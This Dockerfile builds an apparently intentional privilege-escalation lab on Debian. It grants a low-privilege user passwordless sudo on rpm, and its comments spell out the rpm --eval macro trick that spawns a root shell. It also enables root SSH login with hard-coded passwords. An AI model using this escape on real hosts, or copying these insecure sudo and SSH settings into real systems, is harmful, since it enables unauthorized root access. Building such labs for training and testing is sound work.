FROM debian:bookworm-slim

# ============================================================
# PrivEscalate Scenario: sudo_rpm
# ATT&CK: T1548.003 | CWE: CWE-269
# Vulnerability: sudo misconfiguration allows running /usr/bin/rpm as root
# Exploit: sudo rpm --eval '%(/bin/sh 1>&2)'
# ============================================================

ENV DEBIAN_FRONTEND=noninteractive

# Install SSH server, sudo, and rpm
RUN apt-get update && \
    apt-get install -y \
        openssh-server \
        sudo \
        rpm \
    && rm -rf /var/lib/apt/lists/* \
    && mkdir -p /run/sshd

# Verify rpm is installed
RUN which rpm && ls -la /usr/bin/rpm

# Create low-privilege user
RUN useradd -m -s /bin/bash lowpriv && \
    echo "lowpriv:password123" | chpasswd

# --- Configure sudo vulnerability ---
# rpm supports macro evaluation with --eval, which can execute arbitrary commands.
# The exploit: sudo rpm --eval '%(/bin/sh 1>&2)'
# This spawns a root shell via rpm's macro expansion feature.
RUN echo "lowpriv ALL=(root) NOPASSWD: /usr/bin/rpm" > /etc/sudoers.d/rpm && \
    chmod 440 /etc/sudoers.d/rpm

# Verify sudo configuration
RUN visudo -c

# Keep SUID on sudo
RUN chmod u+s /usr/bin/sudo

# Configure SSH
RUN sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config && \
    sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
    echo "root:aim8Du7h" | chpasswd

EXPOSE 22
CMD ["/usr/sbin/sshd", "-D"]